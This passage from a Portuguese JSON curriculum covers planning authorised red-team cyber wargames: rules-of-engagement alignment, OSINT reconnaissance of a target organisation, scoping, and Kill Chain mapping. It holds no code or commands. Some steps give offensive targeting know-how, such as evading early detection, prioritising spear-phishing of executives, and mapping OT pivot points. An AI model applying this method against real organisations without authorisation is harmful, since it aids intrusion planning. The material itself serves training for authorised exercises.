                                  "verification": "Relatório aprovado por stakeholders e plano estratégico atualizado.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Relatório template",
                                    "Ferramenta de colaboração (ex: Microsoft Teams)",
                                    "Plano estratégico draft"
                                  ],
                                  "tips": "Mantenha trilha de mudanças com versionamento para auditoria futura.",
                                  "learningObjective": "Finalizar objetivos totalmente alinhados e documentados para execução segura.",
                                  "commonMistakes": [
                                    "Ajustes insuficientes que mascaram violações",
                                    "Pular validação com stakeholders",
                                    "Não versionar mudanças"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um wargame cibernético simulando ataque a infraestrutura crítica, o objetivo inicial 'Executar DDoS real em servidor de teste' conflita com RoE que proíbe disrupções externas. Ajuste para 'Simular DDoS em ambiente isolado com ferramentas como LOIC em VM', documentando alinhamento com cláusula 4.2 das RoE (proibição de impactos reais).",
                              "finalVerifications": [
                                "100% dos objetivos mapeados sem violações RoE identificadas.",
                                "Relatório de alinhamento aprovado por pelo menos dois stakeholders.",
                                "Matriz de mapeamento atualizada com justificativas citando RoE.",
                                "Plano estratégico revisado incorpora todos os ajustes.",
                                "Simulação de walkthrough confirma conformidade prática.",
                                "Checklist de riscos éticos/legais zerado."
                              ],
                              "assessmentCriteria": [
                                "Precisão no mapeamento: todas citações RoE corretas (90%+).",
                                "Completude dos ajustes: zero violações residuais.",
                                "Qualidade da documentação: clara, concisa e auditável.",
                                "Eficiência temporal: dentro do estimado total (5-8 horas).",
                                "Criatividade nos ajustes: soluções inovadoras mantendo eficácia estratégica.",
                                "Validação stakeholder: aprovação unânime."
                              ],
                              "crossCurricularConnections": [
                                "Ética em Segurança Cibernética: análise de dilemas morais em simulações.",
                                "Direito Internacional e Cibernético: conformidade com convenções como Tallinn Manual.",
                                "Gestão de Riscos e Compliance: integração com frameworks como NIST ou ISO 27001.",
                                "Liderança e Tomada de Decisão: priorização em cenários de conflito."
                              ],
                              "realWorldApplication": "Em operações cibernéticas reais, como as conduzidas por equipes de Red Team do Departamento de Defesa dos EUA, alinhar objetivos com RoE previne violações legais (ex: sob a Executive Order 13636), evita escaladas desnecessárias e assegura missões éticas, como visto em exercícios conjuntos com aliados da OTAN."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.2.1.3",
                            "name": "Avaliar Consciência Situacional Inicial",
                            "description": "Realizar uma análise preliminar da consciência situacional da organização alvo para priorizar objetivos que explorem vulnerabilidades reais, utilizando conceitos de mindsets adversários.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Mapear a Estrutura Organizacional da Empresa Alvo",
                                  "subSteps": [
                                    "Identificar a estrutura hierárquica e departamentos chave via fontes OSINT (sites oficiais, LinkedIn, relatórios anuais).",
                                    "Listar ativos críticos como sistemas de TI, redes, aplicações web e dados sensíveis.",
                                    "Coletar informações sobre fornecedores e parceiros terceirizados.",
                                    "Documentar histórico de incidentes de segurança pública.",
                                    "Criar um diagrama visual da organização."
                                  ],
                                  "verification": "Diagrama completo da estrutura organizacional validado contra fontes múltiplas.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Acesso à internet",
                                    "Ferramentas OSINT como Maltego ou Shodan",
                                    "LinkedIn Premium (opcional)",
                                    "Relatórios SEC/ANPD"
                                  ],
                                  "tips": "Priorize fontes públicas para evitar detecção precoce.",
                                  "learningObjective": "Compreender a topologia organizacional para identificar pontos de entrada potenciais.",
                                  "commonMistakes": [
                                    "Depender de uma única fonte de informação",
                                    "Ignorar parceiros terceirizados",
                                    "Não validar dados com cruzamento de fontes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Avaliar o Nível Atual de Consciência Situacional",
                                  "subSteps": [
                                    "Analisar os três níveis: Percepção (sensores e monitoramento atuais), Compreensão (ferramentas de análise) e Projeção (previsões de ameaças).",
                                    "Revisar políticas públicas de segurança e treinamentos divulgados.",
                                    "Identificar gaps em monitoramento (ex: falta de SIEM ou EDR visível).",
                                    "Avaliar respostas a incidentes passados reportados.",
                                    "Pontuar o nível geral (baixo/médio/alto) com justificativa."
                                  ],
                                  "verification": "Relatório de avaliação com pontuação e evidências por nível.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Documentos públicos da empresa",
                                    "Relatórios de brechas (ex: Have I Been Pwned)",
                                    "Frameworks como NIST Cybersecurity Framework"
                                  ],
                                  "tips": "Use o modelo OODA (Observe-Orient-Decide-Act) para estruturar a análise.",
                                  "learningObjective": "Diagnosticar fraquezas na percepção, compreensão e projeção situacional.",
                                  "commonMistakes": [
                                    "Subestimar capacidades ocultas",
                                    "Focar apenas em TI e ignorar aspectos humanos",
                                    "Não contextualizar com benchmarks do setor"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aplicar Mindsets Adversários para Identificar Vulnerabilidades",
                                  "subSteps": [
                                    "Adotar perspectivas de adversários como APTs chinesas (persistência stealth) ou script kiddies (exploração rápida).",
                                    "Mapear vulnerabilidades reais: configurações expostas, patches pendentes, engenharia social.",
                                    "Simular cenários de ataque baseados em mindsets (ex: insider threat via mindset oportunista).",
                                    "Classificar vulnerabilidades por criticidade (CVSS score adaptado).",
                                    "Documentar como a baixa consciência situacional amplifica essas vulnerabilidades."
                                  ],
                                  "verification": "Matriz de vulnerabilidades com mindsets associados e scores.",
                                  "estimatedTime": "5 horas",
                                  "materials": [
                                    "MITRE ATT&CK Framework",
                                    "Ferramentas como Nmap para scans passivos",
                                    "Relatórios de threat intelligence (ex: Mandiant M-Trends)"
                                  ],
                                  "tips": "Pense como o adversário: 'O que eu faria se fosse o alvo?'",
                                  "learningObjective": "Utilizar mindsets adversários para priorizar ameaças realistas.",
                                  "commonMistakes": [
                                    "Aplicar mindsets genéricos sem contexto setorial",
                                    "Ignorar vetores humanos como phishing",
                                    "Superestimar defesas sem evidência"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Priorizar Objetivos Estratégicos Baseados na Análise",
                                  "subSteps": [
                                    "Cruzar vulnerabilidades com impactos potenciais (financeiro, reputacional).",
                                    "Definir objetivos priorizados (ex: comprometer rede interna em 1º, exfiltração em 2º).",
                                    "Criar roadmap de exploração com dependências.",
                                    "Validar priorização com simulação qualitativa de ROI adversário.",
                                    "Documentar relatório final com recomendações."
                                  ],
                                  "verification": "Lista priorizada de 5-10 objetivos com justificativas e roadmap.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Planilhas Excel/Google Sheets para matriz de priorização",
                                    "Templates de relatórios de threat modeling"
                                  ],
                                  "tips": "Use matriz Eisenhower (urgente/importante) para priorização.",
                                  "learningObjective": "Transformar análise em objetivos acionáveis e priorizados.",
                                  "commonMistakes": [
                                    "Priorizar por facilidade em vez de impacto",
                                    "Não considerar defesas residuais",
                                    "Criar objetivos irreais sem base factual"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de red teaming contra o 'Banco Seguro SA', mapeie a estrutura via site e LinkedIn, identifique gaps em monitoramento (sem menção a EDR), aplique mindset de APT para priorizar spear-phishing em executivos, resultando em objetivo principal: acesso inicial via credenciais roubadas.",
                              "finalVerifications": [
                                "Relatório completo com diagrama organizacional e matriz de vulnerabilidades.",
                                "Pontuação de consciência situacional justificada com evidências OSINT.",
                                "Lista de 5+ objetivos priorizados alinhados a mindsets adversários.",
                                "Simulação de pelo menos um cenário de exploração validada.",
                                "Ausência de gaps lógicos na priorização (revisão por pares).",
                                "Documentação de fontes usadas para reprodutibilidade."
                              ],
                              "assessmentCriteria": [
                                "Profundidade da pesquisa OSINT (cobertura de múltiplas fontes: 30%).",
                                "Precisão na avaliação dos níveis de consciência situacional (25%).",
                                "Criatividade e adequação dos mindsets adversários aplicados (20%).",
                                "Lógica e impacto na priorização de objetivos (15%).",
                                "Clareza e profissionalismo do relatório final (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Inteligência e Análise OSINT (coleta de dados abertos).",
                                "Psicologia Comportamental (mindsets adversários e engenharia social).",
                                "Gestão de Riscos Empresariais (avaliação de impactos).",
                                "Estratégia Militar (modelo OODA e planejamento de campanhas).",
                                "Ética em Cibersegurança (limites de simulações ofensivas)."
                              ],
                              "realWorldApplication": "Em operações de Red Team para empresas como bancos ou governos, essa avaliação inicial permite priorizar ataques realistas em exercícios de jogos de guerra cibernéticos, simulando APTs como SolarWinds ou NotPetya, ajudando defesas a fortalecerem gaps antes de incidentes reais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.2.2",
                        "name": "Definição de Escopo e Limites",
                        "description": "Fase de delimitação do escopo do cenário, identificando ativos críticos, fronteiras operacionais e restrições, para evitar expansões descontroladas e focar em simulações realistas de ameaças cibernéticas.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.2.2.1",
                            "name": "Identificar Ativos Críticos e Ambientes",
                            "description": "Mapear ativos de TI/OT críticos da organização alvo, incluindo redes, sistemas e dados sensíveis, para definir o escopo do cenário com base em montagem de ambientes de jogos cibernéticos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Realizar Pesquisa Inicial e Coleta de Dados sobre a Organização",
                                  "subSteps": [
                                    "Reunir documentação interna disponível, como diagramas de rede e inventários de ativos",
                                    "Realizar OSINT (Open Source Intelligence) para mapear presença online da organização",
                                    "Entrevistar stakeholders chave para identificar ativos TI/OT não documentados",
                                    "Catalogar tipos de ativos: hardware TI (servidores, workstations), OT (PLCs, SCADA), dados sensíveis (PII, IP)",
                                    "Documentar suposições iniciais e fontes de informação"
                                  ],
                                  "verification": "Relatório inicial de pesquisa compilado com lista preliminar de ativos e fontes citadas",
                                  "estimatedTime": "4-6 horas",
                                  "materials": [
                                    "Ferramentas OSINT (Maltego, Shodan, theHarvester)",
                                    "Templates de relatório em Markdown ou Excel",
                                    "Acesso a documentação organizacional simulada"
                                  ],
                                  "tips": "Comece com fontes públicas para evitar alertas; valide com múltiplas fontes",
                                  "learningObjective": "Desenvolver habilidades em coleta de inteligência para identificar ativos potenciais",
                                  "commonMistakes": [
                                    "Ignorar ativos OT em ambientes industriais",
                                    "Confiar em uma única fonte sem cross-verificação"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Classificar Ativos Críticos",
                                  "subSteps": [
                                    "Listar todos os ativos identificados e atribuir classificações de criticidade (alta, média, baixa) baseada em impacto (confidencialidade, integridade, disponibilidade)",
                                    "Categorizar por tipo: TI (redes, sistemas operacionais), OT (dispositivos industriais, sensores), dados (bancos de dados, arquivos sensíveis)",
                                    "Avaliar dependências entre ativos (ex: SCADA dependendo de rede corporativa)",
                                    "Priorizar ativos com base em valor para o negócio e exposição a ameaças",
                                    "Criar tabela de inventário com colunas: Nome, Tipo, Localização, Criticidade, Proprietário"
                                  ],
                                  "verification": "Tabela de inventário completa com pelo menos 80% dos ativos classificados",
                                  "estimatedTime": "3-5 horas",
                                  "materials": [
                                    "Planilhas Excel/Google Sheets para inventário",
                                    "Matriz CIA Triad para classificação",
                                    "Guia NIST SP 800-53 para critérios de criticidade"
                                  ],
                                  "tips": "Use a matriz CIA para classificação objetiva; envolva experts em OT se possível",
                                  "learningObjective": "Aprender a classificar ativos por risco e impacto organizacional",
                                  "commonMistakes": [
                                    "Subestimar criticidade de ativos OT legacy",
                                    "Classificar baseado em custo em vez de impacto operacional"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Redes, Ambientes e Interconexões",
                                  "subSteps": [
                                    "Desenhar diagrama de rede identificando segmentos (DMZ, corporativo, OT isolado)",
                                    "Mapear fluxos de dados entre ativos TI/OT e pontos de entrada/saída",
                                    "Identificar ambientes lógicos: produção, teste, nuvem híbrida",
                                    "Destacar vulnerabilidades potenciais em interconexões (ex: jump servers)",
                                    "Validar mapa com ferramentas de simulação ou walkthrough virtual"
                                  ],
                                  "verification": "Diagrama visual de rede e ambientes aprovado por revisão peer",
                                  "estimatedTime": "4-6 horas",
                                  "materials": [
                                    "Ferramentas de diagramação (Draw.io, Lucidchart, Visio)",
                                    "Simuladores de rede (GNS3, Cisco Packet Tracer)",
                                    "Templates de arquitetura de referência para TI/OT"
                                  ],
                                  "tips": "Use camadas de cor para criticidade; foque em fluxos laterais em OT",
                                  "learningObjective": "Dominar mapeamento visual de ambientes complexos TI/OT",
                                  "commonMistakes": [
                                    "Omitir air-gaps ou segmentações reais",
                                    "Criar diagramas muito complexos sem legenda clara"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Definir Escopo do Cenário e Validar Mapeamento",
                                  "subSteps": [
                                    "Integrar mapa de ativos ao escopo do jogo cibernético (objetivos de ataque, regras de engagement)",
                                    "Definir limites: ativos in-scope vs out-of-scope, cenários de falha permitidos",
                                    "Realizar validação com stakeholders simulados ou experts",
                                    "Atualizar documentação com riscos identificados e recomendações de defesa",
                                    "Preparar relatório final para briefing do exercício"
                                  ],
                                  "verification": "Documento de escopo finalizado e aprovado, pronto para uso no cenário",
                                  "estimatedTime": "2-4 horas",
                                  "materials": [
                                    "Template de Rules of Engagement (ROE) para jogos cibernéticos",
                                    "Ferramentas de colaboração (Microsoft Teams, Notion)"
                                  ],
                                  "tips": "Mantenha escopo focado em 5-10 ativos principais para viabilidade",
                                  "learningObjective": "Aplicar mapeamento para delinear cenários realistas de threat hunting",
                                  "commonMistakes": [
                                    "Expandir escopo além de recursos disponíveis",
                                    "Ignorar validação externa no mapeamento"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação de planta petroquímica, identifique PLCs controlando válvulas como ativos OT críticos (alta criticidade por risco de explosão), servidores SCADA na rede corporativa (média), e dados de sensores IoT (alta por IP proprietária). Mapeie rede segmentada com jump server como ponto de pivô, definindo escopo para ataque simulado de ransomware lateral.",
                              "finalVerifications": [
                                "Mapa completo de ativos TI/OT com classificações e interconexões",
                                "Diagrama visual validado e legível",
                                "Lista priorizada de 5-10 ativos críticos para o cenário",
                                "Documento de escopo alinhado com objetivos do jogo cibernético",
                                "Relatório com suposições, fontes e recomendações",
                                "Validação peer confirmando precisão >90%"
                              ],
                              "assessmentCriteria": [
                                "Completude: Todos ativos relevantes mapeados sem lacunas óbvias",
                                "Precisão: Classificações alinhadas com CIA Triad e contexto organizacional",
                                "Relevância: Ativos focados no escopo do cenário de ameaça",
                                "Clareza: Diagramas e relatórios fáceis de entender por não-especialistas",
                                "Profundidade: Identificação de interconexões e riscos laterais",
                                "Viabilidade: Escopo realista para montagem de ambiente de jogo"
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Riscos (NIST RMF para priorização)",
                                "Arquitetura de Redes (Segmentação Purdue Model para TI/OT)",
                                "Análise de Ameaças (MITRE ATT&CK para mapeamento de táticas)",
                                "Compliance e Auditoria (ISO 27001 para inventário de ativos)",
                                "Simulação e Modelagem (Cyber Range design)"
                              ],
                              "realWorldApplication": "Em operações de Red Team/Blue Team, esse mapeamento define alvos realistas para exercícios de jogos cibernéticos em infraestruturas críticas como energia ou manufatura, permitindo simular ataques como Stuxnet e melhorar defesas proativas contra APTs."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.2.1.1"
                            ]
                          },
                          {
                            "id": "10.1.4.2.2.2",
                            "name": "Estabelecer Limites e Exclusões",
                            "description": "Definir fronteiras geográficas, técnicas e temporais do exercício, excluindo sistemas off-limits e integrando indicadores de compromisso para monitoramento seguro.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Mapear Limites Geográficos e Infraestrutura Relevante",
                                  "subSteps": [
                                    "Identifique as redes, data centers e locais físicos envolvidos no exercício cibernético.",
                                    "Crie um diagrama visual das fronteiras geográficas, marcando zonas permitidas e proibidas.",
                                    "Consulte stakeholders para confirmar restrições legais e regulatórias por localização.",
                                    "Registre coordenadas ou endereços IP geolocalizados para precisão.",
                                    "Valide o mapa com uma revisão inicial de equipe."
                                  ],
                                  "verification": "Diagrama geográfico aprovado por stakeholders com todas as zonas demarcadas.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Ferramentas de mapeamento como Google Earth ou Lucidchart",
                                    "Documentos de infraestrutura de rede",
                                    "Lista de stakeholders"
                                  ],
                                  "tips": "Use camadas coloridas no diagrama para diferenciar zonas de alto risco.",
                                  "learningObjective": "Compreender e visualizar fronteiras geográficas para evitar expansões não autorizadas.",
                                  "commonMistakes": [
                                    "Ignorar regulamentações locais como GDPR em regiões europeias",
                                    "Subestimar a extensão de redes em nuvem híbrida"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir Limites Técnicos e Exclusões de Sistemas Off-Limits",
                                  "subSteps": [
                                    "Liste todos os sistemas, aplicações e endpoints potenciais de interação.",
                                    "Classifique sistemas como 'off-limits' baseados em criticidade (ex: produção vs. staging).",
                                    "Especifique regras de firewall, ACLs e whitelists para enforcement técnico.",
                                    "Documente exceções com aprovações prévias e condições de reversão.",
                                    "Teste regras em ambiente de staging para validar exclusões."
                                  ],
                                  "verification": "Lista de exclusões assinada com testes de conectividade falhando em off-limits.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas de rede como Wireshark ou Nmap",
                                    "Políticas de segurança da organização",
                                    "Templates de Rules of Engagement (RoE)"
                                  ],
                                  "tips": "Priorize sistemas com dados sensíveis ou impacto em downtime.",
                                  "learningObjective": "Estabelecer barreiras técnicas robustas para proteger ativos críticos.",
                                  "commonMistakes": [
                                    "Esquecer de sistemas legados não mapeados",
                                    "Definir regras vagas que permitam creep de escopo"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estabelecer Limites Temporais e Cronograma do Exercício",
                                  "subSteps": [
                                    "Defina data/hora de início e fim exatas, incluindo janelas de pausa.",
                                    "Crie um cronograma com fases (ex: reconnaissance, exploitation, cleanup).",
                                    "Inclua buffers para incidentes e notificações de escalonamento.",
                                    "Sincronize fusos horários para equipes distribuídas.",
                                    "Publique o cronograma em ferramenta compartilhada para visibilidade."
                                  ],
                                  "verification": "Cronograma aprovado com alertas automáticos configurados para fim de exercício.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Calendários compartilhados como Google Calendar ou Microsoft Teams",
                                    "Templates de cronograma de exercícios cibernéticos"
                                  ],
                                  "tips": "Adicione 30% de buffer para imprevistos em exercícios de guerra cibernética.",
                                  "learningObjective": "Garantir que o exercício tenha duração controlada para minimizar riscos.",
                                  "commonMistakes": [
                                    "Não considerar feriados ou horários de pico de negócio",
                                    "Cronogramas muito apertados sem margem para cleanup"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Indicadores de Compromisso e Mecanismos de Monitoramento",
                                  "subSteps": [
                                    "Defina indicadores claros de compromisso (IoCs) como padrões de tráfego ou logs específicos.",
                                    "Configure ferramentas de monitoramento em tempo real (SIEM, EDR).",
                                    "Estabeleça thresholds para detecção automática de violações de limites.",
                                    "Treine equipe em protocolos de resposta a violações detectadas.",
                                    "Simule uma violação para testar o monitoramento end-to-end."
                                  ],
                                  "verification": "Relatório de simulação mostrando detecção e resposta em menos de 5 minutos.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Ferramentas SIEM como Splunk ou ELK Stack",
                                    "Lista de IoCs padronizada",
                                    "Scripts de simulação"
                                  ],
                                  "tips": "Use IoCs falsos positivos controlados para treinamento sem alarme real.",
                                  "learningObjective": "Implementar safeguards proativos para detecção segura de desvios.",
                                  "commonMistakes": [
                                    "IoCs muito genéricos que geram falsos positivos excessivos",
                                    "Falta de integração com equipes de SOC externas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernético simulando um ataque ransomware em uma rede bancária simulada, defina limites geográficos aos servidores em data centers da Europa Ocidental, exclua sistemas de produção reais, limite a 48 horas de 09:00-17:00 UTC, e integre IoCs como tráfego SMB suspeito monitorado via Splunk para pausar se ultrapassar thresholds.",
                              "finalVerifications": [
                                "Todos os limites (geo, técnico, temporal) estão documentados e aprovados por stakeholders.",
                                "Testes de simulação confirmam enforcement de exclusões sem vazamentos.",
                                "Mecanismos de monitoramento estão ativos com alertas testados.",
                                "Regras de Engagement (RoE) incluem procedimentos de abortar exercício.",
                                "Backup e plano de reversão para qualquer violação estão prontos.",
                                "Equipe treinada reconhece e responde a violações de limites."
                              ],
                              "assessmentCriteria": [
                                "Clareza e precisão na definição de todos os limites (nota 1-10).",
                                "Completude da documentação com diagramas e listas verificáveis.",
                                "Eficácia dos testes de validação (zero falhas em simulações).",
                                "Integração robusta de monitoramento com tempos de resposta <5min.",
                                "Alinhamento com regulamentações legais e políticas organizacionais.",
                                "Facilidade de comunicação e compreensão pela equipe."
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Projetos: Uso de cronogramas Gantt para limites temporais.",
                                "Direito e Compliance: Aplicação de leis como GDPR em limites geográficos.",
                                "Análise de Riscos: Integração de matrizes de risco em exclusões técnicas.",
                                "Engenharia de Redes: Configuração prática de ACLs e firewalls.",
                                "Liderança e Comunicação: Treinamento de equipes em RoE."
                              ],
                              "realWorldApplication": "Em operações red team reais ou pentests autorizados, como os conduzidos por equipes de CERT ou consultorias de cibersegurança, esses limites previnem danos colaterais, garantem conformidade legal e permitem pausas seguras, como visto em exercícios da NATO Cyber Coalition onde violações de escopo foram detectadas via IoCs em tempo real."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.2.1.2"
                            ]
                          },
                          {
                            "id": "10.1.4.2.2.3",
                            "name": "Documentar Escopo em Plano Formal",
                            "description": "Criar um documento formal de escopo com diagramas e descrições, inspirado em handbooks como Blue Team Handbook, para compartilhamento com equipes envolvidas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Coletar e Analisar Requisitos do Escopo",
                                  "subSteps": [
                                    "Identifique os objetivos principais do exercício cibernético ou jogo de guerra.",
                                    "Liste stakeholders envolvidos e suas expectativas específicas.",
                                    "Reúna dados de ameaças relevantes, incluindo cenários de ataque potenciais.",
                                    "Defina limites claros: o que está dentro e fora do escopo (in-scope/out-of-scope).",
                                    "Documente restrições técnicas, legais e éticas iniciais."
                                  ],
                                  "verification": "Verifique se há uma lista completa de requisitos com entradas de pelo menos 3 stakeholders e definição clara de limites.",
                                  "estimatedTime": "2-4 horas",
                                  "materials": "Blue Team Handbook, templates de escopo de projetos cibernéticos, notas de reuniões com stakeholders, ferramentas de mind mapping como MindMeister.",
                                  "tips": "Use perguntas abertas com stakeholders para evitar ambiguidades desde o início.",
                                  "learningObjective": "Entender e capturar todos os elementos essenciais que definem o escopo de um exercício cibernético.",
                                  "commonMistakes": "Ignorar perspectivas de stakeholders não técnicos, resultando em escopo irrealista."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estruturar o Documento Formal de Escopo",
                                  "subSteps": [
                                    "Crie uma estrutura padrão: introdução, objetivos, limites, premissas, deliverables e riscos.",
                                    "Escreva descrições narrativas claras para cada seção, usando linguagem precisa e sem jargões desnecessários.",
                                    "Inclua uma tabela de escopo com colunas para in-scope, out-of-scope e justificativas.",
                                    "Adicione seções de cronograma preliminar e recursos necessários.",
                                    "Formate o documento com cabeçalhos, numeração e versão controlada."
                                  ],
                                  "verification": "Confira se o documento tem todas as seções padrão e uma tabela de escopo preenchida com pelo menos 5 itens.",
                                  "estimatedTime": "3-5 horas",
                                  "materials": "Modelos de documentos do Blue Team Handbook, editor de texto como Microsoft Word ou Google Docs, controle de versão como Git.",
                                  "tips": "Mantenha o documento conciso: mire em 5-10 páginas para facilitar a leitura.",
                                  "learningObjective": "Desenvolver habilidades para organizar informações complexas em um formato formal e compartilhável.",
                                  "commonMistakes": "Sobrecarregar o documento com detalhes excessivos, tornando-o difícil de revisar."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criar Diagramas e Visualizações do Escopo",
                                  "subSteps": [
                                    "Desenhe um diagrama de escopo de rede destacando ativos in-scope e out-of-scope.",
                                    "Crie fluxogramas para cenários de ameaça e fluxos de operações.",
                                    "Inclua diagramas de Gantt para cronograma e matriz de riscos.",
                                    "Use ferramentas para gerar diagramas profissionais e legíveis.",
                                    "Integre os diagramas ao documento com legendas e referências cruzadas."
                                  ],
                                  "verification": "Teste se os diagramas são compreensíveis sem texto adicional e estão corretamente referenciados no documento.",
                                  "estimatedTime": "4-6 horas",
                                  "materials": "Ferramentas como Lucidchart, Draw.io ou Visio, Blue Team Handbook para exemplos de diagramas cibernéticos.",
                                  "tips": "Use cores consistentes: verde para in-scope, vermelho para out-of-scope.",
                                  "learningObjective": "Aprender a visualizar conceitos abstratos de escopo para melhorar a comunicação.",
                                  "commonMistakes": "Criar diagramas muito complexos que confundem em vez de esclarecer."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Revisar, Finalizar e Preparar para Compartilhamento",
                                  "subSteps": [
                                    "Realize uma revisão interna verificando completude, clareza e precisão.",
                                    "Compartilhe rascunho com stakeholders para feedback e iterações.",
                                    "Incorpore feedbacks e atualize controle de versão.",
                                    "Adicione sumário executivo e anexos se necessário.",
                                    "Exporte em PDF e distribua via canal seguro para equipes."
                                  ],
                                  "verification": "Obtenha aprovação assinada ou por e-mail de pelo menos 2 stakeholders principais.",
                                  "estimatedTime": "2-4 horas",
                                  "materials": "Ferramentas de revisão colaborativa como Google Docs, checklists de revisão de documentos.",
                                  "tips": "Agende reuniões curtas de feedback para agilizar o processo.",
                                  "learningObjective": "Garantir que o documento seja robusto e pronto para uso em equipes multidisciplinares.",
                                  "commonMistakes": "Pular a revisão, levando a mal-entendidos durante a execução do exercício."
                                }
                              ],
                              "practicalExample": "Para um jogo de guerra cibernético simulando um ataque de ransomware em uma rede corporativa simulada, crie um documento de escopo definindo ativos in-scope (servidores de e-mail e estações de trabalho), out-of-scope (sistemas de produção reais), diagramas de rede mostrando zonas de ataque, cronograma de 48 horas e riscos como escalada de privilégios não autorizada.",
                              "finalVerifications": [
                                "O documento inclui todas as seções padrão com descrições claras.",
                                "Diagramas são precisos e legendados adequadamente.",
                                "Limites in/out-of-scope estão explicitamente definidos em tabela.",
                                "Stakeholders aprovaram o escopo final.",
                                "Versão é controlada e compartilhada de forma segura.",
                                "Não há ambiguidades que possam levar a violações de escopo."
                              ],
                              "assessmentCriteria": [
                                "Clareza e precisão da linguagem (sem ambiguidades).",
                                "Completude das seções e cobertura de todos os requisitos.",
                                "Qualidade e relevância dos diagramas visuais.",
                                "Alinhamento com handbooks como Blue Team Handbook.",
                                "Facilidade de compreensão por não-especialistas.",
                                "Controle de versão e rastreabilidade de mudanças."
                              ],
                              "crossCurricularConnections": [
                                "Gerenciamento de Projetos: Uso de templates PMBOK para escopo.",
                                "Comunicação Técnica: Redação clara e visualizações.",
                                "Design Gráfico: Criação de diagramas profissionais.",
                                "Gestão de Riscos: Identificação e mitigação em cenários cibernéticos."
                              ],
                              "realWorldApplication": "Em operações de resposta a incidentes reais, como simulações de CERTs ou exercícios de Red/Blue Team em empresas como Google ou governos, esse documento formal garante alinhamento de equipes, previne vazamentos de dados fora do escopo e facilita auditorias pós-exercício."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.2.3",
                        "name": "Elaboração das Fases Sequenciais",
                        "description": "Construção das etapas sequenciais do cenário de ameaça, modelando o ciclo de vida de um ataque cibernético desde reconnaissance até exfiltração, com foco em pivoting e persistência.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.2.3.1",
                            "name": "Mapear Fases do Kill Chain Cibernético",
                            "description": "Estruturar o cenário em fases sequenciais baseadas no Cyber Kill Chain (Reconhecimento, Armamento, Entrega, Exploração, Instalação, C2, Ações), adaptando para Red Team operations.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Modelo Cyber Kill Chain Original",
                                  "subSteps": [
                                    "Estude a documentação original do Lockheed Martin Cyber Kill Chain.",
                                    "Liste e defina as 7 fases: Reconhecimento, Armamento, Entrega, Exploração, Instalação, C2 e Ações.",
                                    "Identifique o propósito de cada fase no ciclo de ataque.",
                                    "Compare com frameworks semelhantes como MITRE ATT&CK.",
                                    "Anote dependências sequenciais entre fases."
                                  ],
                                  "verification": "Criar uma tabela resumindo as 7 fases com definições e exemplos breves.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documento oficial do Cyber Kill Chain (PDF)",
                                    "MITRE ATT&CK Navigator",
                                    "Notas em Markdown ou Excel"
                                  ],
                                  "tips": "Use mnemônicos como 'RAEDICA' para memorizar as fases (Recon, Arm, Delivery, Exploit, Install, C2, Actions).",
                                  "learningObjective": "Dominar as fases fundamentais do Cyber Kill Chain e suas interconexões.",
                                  "commonMistakes": [
                                    "Confundir 'Armamento' com 'Exploração'",
                                    "Ignorar a natureza iterativa do chain",
                                    "Omitir exemplos reais de cada fase"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Adaptar Fases para Operações Red Team",
                                  "subSteps": [
                                    "Analise diferenças entre ataques reais e simulações Red Team (éticas e controladas).",
                                    "Mapeie cada fase para táticas Red Team, como uso de proxies em Recon.",
                                    "Incorpore regras de engajamento (RoE) em cada fase.",
                                    "Defina métricas de sucesso para Red Team em cada etapa.",
                                    "Documente adaptações específicas, como payloads customizados em Armamento."
                                  ],
